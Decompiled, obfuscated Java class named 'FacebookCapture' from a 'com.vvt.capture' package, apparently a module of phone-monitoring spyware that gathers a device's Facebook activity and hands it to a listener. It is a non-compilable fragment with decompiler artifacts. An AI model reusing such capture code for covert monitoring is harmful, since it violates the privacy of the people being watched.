package com.vvt.capture.b;

import com.vvt.base.RunningMode;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.e;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.b.a.c;
import com.vvt.capture.b.a.h;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;

public class b
  extends com.vvt.base.capture.b
{
  private static final boolean a = com.vvt.ak.a.b;
  private static final boolean b = com.vvt.ak.a.e;
  private com.vvt.base.a c;
  private String d;
  private e e;
  private f f;
  private com.vvt.base.b g;
  
  public b(String paramString, com.vvt.base.a parama, RunningMode paramRunningMode, com.vvt.n.a.b paramb, com.vvt.base.b paramb1)
  {
    this.d = paramString;
    this.c = parama;
    this.g = paramb1;
    Object localObject1 = RunningMode.LIMITED_1;
    Object localObject2;
    if (paramRunningMode == localObject1)
    {
      localObject1 = new com/vvt/capture/b/b/a;
      localObject2 = paramb1.f();
      ((com.vvt.capture.b.b.a)localObject1).<init>(paramString, paramb, (String)localObject2);
      this.e = ((e)localObject1);
      localObject1 = new com/vvt/capture/b/b/d;
      localObject2 = this.g;
      ((com.vvt.capture.b.b.d)localObject1).<init>(paramString, (com.vvt.base.b)localObject2);
      this.f = ((f)localObject1);
    }
    for (;;)
    {
      return;
      localObject1 = RunningMode.FULL;
      if (paramRunningMode == localObject1)
      {
        localObject1 = new com/vvt/capture/b/a/c;
        ((c)localObject1).<init>();
        this.e = ((e)localObject1);
        localObject1 = new com/vvt/capture/b/a/h;
        localObject2 = this.g;
        ((h)localObject1).<init>(paramString, (com.vvt.base.b)localObject2);
        this.f = ((f)localObject1);
      }
      else
      {
        boolean bool = b;
        if (!bool) {}
      }
    }
  }
  
  protected g a(g paramg)
  {
    boolean bool = paramg instanceof FxSimpleEventReference;
    if (bool) {
      paramg = (FxSimpleEventReference)paramg;
    }
    for (;;)
    {
      return paramg;
      paramg = new com/vvt/base/capture/FxSimpleEventReference;
      paramg.<init>();
    }
  }
  
  public void a(com.vvt.base.b paramb)
  {
    this.g = paramb;
    boolean bool = a;
    if (bool) {}
  }
  
  protected void a(List paramList)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool1 = a;
    if (bool1) {}
    Iterator localIterator = paramList.iterator();
    for (;;)
    {
      bool1 = localIterator.hasNext();
      if (!bool1) {
        break;
      }
      localObject = localIterator.next();
      boolean bool2 = localObject instanceof d;
      if (bool2)
      {
        localObject = com.vvt.capture.b.a.a.a((d)localObject);
        if (localObject != null)
        {
          int i = ((List)localObject).size();
          if (i > 0) {
            localArrayList.addAll((Collection)localObject);
          }
        }
      }
    }
    Object localObject = this.c;
    if (localObject != null)
    {
      bool1 = k();
      if (bool1)
      {
        bool1 = a;
        if (bool1) {}
        localObject = this.c;
        ((com.vvt.base.a)localObject).a(localArrayList);
      }
    }
  }
  
  protected e b()
  {
    return this.e;
  }
  
  protected f c()
  {
    return this.f;
  }
  
  protected String d()
  {
    return "FacebookCapture";
  }
  
  protected String e()
  {
    return this.d;
  }
  
  protected String f()
  {
    return "facebook.ref";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/removeFromPath/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */